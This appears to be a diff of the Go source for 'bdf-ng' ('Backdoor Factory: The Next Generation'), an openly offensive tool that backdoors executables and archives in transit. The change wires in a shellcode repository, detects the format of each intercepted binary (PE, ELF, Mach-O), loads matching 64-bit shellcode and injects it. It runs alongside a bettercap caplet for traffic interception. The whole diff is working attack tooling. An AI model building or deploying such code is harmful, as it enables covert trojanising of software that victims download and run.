@@ -11,10 +11,13 @@ import (
 	"path/filepath"
 	"runtime"
 
+	"github.com/Binject/shellcode/api"
+
 	"github.com/akamensky/argparse"
 	"github.com/mholt/archiver"
 
 	"github.com/Binject/binjection/bj"
+	"github.com/Binject/shellcode"
 	"github.com/h2non/filetype"
 )
 
@@ -24,9 +27,13 @@ func main() {
 		log.Fatal(err)
 	}
 	parser := argparse.NewParser("bdf-ng", "Backdoor Factory: The Next Generation")
+	scDir := parser.String("s", "shelldir", &argparse.Options{Required: true,
+		Default: filepath.Join(dir, "shellcode"), Help: "Shellcode Directory"})
 	cwd := parser.String("d", "cwd", &argparse.Options{Required: false,
 		Default: dir, Help: "Working Directory"})
-	testfile := parser.String("s", "sc", &argparse.Options{Required: true,
+	initMode := parser.Flag("p", "init", &argparse.Options{Required: false,
+		Help: "Create the empty shellcode directories and quit"})
+	testfile := parser.String("i", "shellfile", &argparse.Options{Required: false,
 		Help: "File to inject (oneshot test mode)"})
 	outfile := parser.String("o", "out", &argparse.Options{Required: false,
 		Help: "Output file (oneshot test mode)"})
@@ -38,6 +45,13 @@ func main() {
 		*outfile = *testfile + ".b"
 	}
 
+	repo := shellcode.NewRepo(*scDir)
+	if *initMode {
+		log.Println("Shellcode Directories Initialized, copy shellcode files with .bin extensions into each directory.")
+		return
+	}
+	config := &bj.BinjectConfig{Repo: repo, CodeCaveMode: false}
+
 	if *testfile != "" { // One-shot test mode
 		f, err := os.Open(*testfile)
 		if err != nil {
@@ -47,7 +61,7 @@ func main() {
 		if err != nil {
 			log.Fatal(err)
 		}
-		wet, err := Inject(dry)
+		wet, err := Inject(dry, config)
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -77,14 +91,12 @@ func main() {
 
 	log.Printf("RUN THIS COMMAND in another terminal:\n\tbettercap -caplet %s\n", capletPath)
 
-	go ListenPipeDry(dryPipe)
+	go ListenPipeDry(dryPipe, config)
 	ListenPipeWet(wetPipe)
 }
 
 // Inject a binary or archive
-func Inject(dry []byte) (wet []byte, err error) {
-
-	config := &bj.BinjectConfig{CodeCaveMode: false}
+func Inject(dry []byte, config *bj.BinjectConfig) (wet []byte, err error) {
 
 	kind, _ := filetype.Match(dry)
 	if kind == filetype.Unknown || kind.MIME.Type != "application" {
@@ -149,7 +161,28 @@ func Inject(dry []byte) (wet []byte, err error) {
 		}
 
 	case "x-executable":
-		return bj.Binject(dry, []byte{0, 0, 0, 0}, config)
+
+		bintype, err := bj.BinaryMagic(dry)
+		if err != nil {
+			return nil, err
+		}
+		os := api.Windows
+		switch bintype {
+		case bj.MACHO:
+			os = api.Darwin
+		case bj.ELF:
+			os = api.Linux
+		case bj.PE:
+			os = api.Windows
+		}
+		// todo: detect 32 vs 64 bit, for now just default to 64
+
+		scdata, err := config.Repo.Lookup(os, api.Intel64, "*.bin")
+		if err != nil {
+			return nil, err
+		}
+
+		return bj.Binject(dry, scdata, config)
 	}
 
 	return dry, nil // default to doing nothing
@@ -174,7 +207,7 @@ func Walk(t archiver.Reader, archive []byte, walkFn archiver.WalkFunc) error {
 		}
 		err = walkFn(f)
 		if err != nil {
-			fmt.Errorf("walking %s: %v", f.Name(), err)
+			fmt.Printf("walking %s: %v\n", f.Name(), err)
 			return nil
 		}
 	}
